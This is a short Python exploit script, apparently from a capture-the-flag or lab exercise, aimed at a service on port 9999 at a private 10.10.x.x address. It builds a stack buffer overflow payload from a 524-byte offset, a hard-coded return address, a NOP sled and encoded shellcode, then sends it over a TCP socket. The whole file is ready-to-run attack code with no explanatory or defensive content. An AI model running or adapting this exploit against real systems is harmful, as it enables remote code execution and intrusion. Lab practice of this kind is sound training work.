#!/usr/bin/env python3

import socket, sys


'''
Getting offset 
'''


ip = "10.10.89.116"
port = 9999

crashed_pt = 992

prefix = b""
offset = 524
overflow = b"A" * offset
retn = b"\xf3\x12\x17\x31"
padding = b"\x90"*16      # used for giving some space to unpack encoding(in this case, shikataganai)

buf =  b""
buf += b"\xbf\xbd\x88\x82\x62\xda\xc1\xd9\x74\x24\xf4\x5d\x31"
buf += b"\xc9\xb1\x12\x31\x7d\x12\x03\x7d\x12\x83\x50\x74\x60"
buf += b"\x97\x9b\x5e\x92\xbb\x88\x23\x0e\x56\x2c\x2d\x51\x16"
buf += b"\x56\xe0\x12\xc4\xcf\x4a\x2d\x26\x6f\xe3\x2b\x41\x07"
buf += b"\xfe\xc3\xc1\x2a\x96\xd1\x21\xc5\x3b\x5f\xc0\x55\xa5"
buf += b"\x0f\x52\xc6\x99\xb3\xdd\x09\x10\x33\x8f\xa1\xc5\x1b"
buf += b"\x43\x59\x72\x4b\x8c\xfb\xeb\x1a\x31\xa9\xb8\x95\x57"
buf += b"\xfd\x34\x6b\x17"

shellcode = buf

chars = b""
#C"*(crashed_pt - offset - len(retn) - len(padding) - len(shellcode))

#postfix = b""

payload = prefix + overflow + retn + padding + shellcode + chars #Add NOPs \x90

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
    s.connect((ip,port))
    print("Sending payload...")
    #s.recv(1024)
    s.send(payload + b'\r\n')
    #s.recv(1024)
    print("Done!")
    s.close

except:
    print("Cannot connect to server")
    sys.exit()
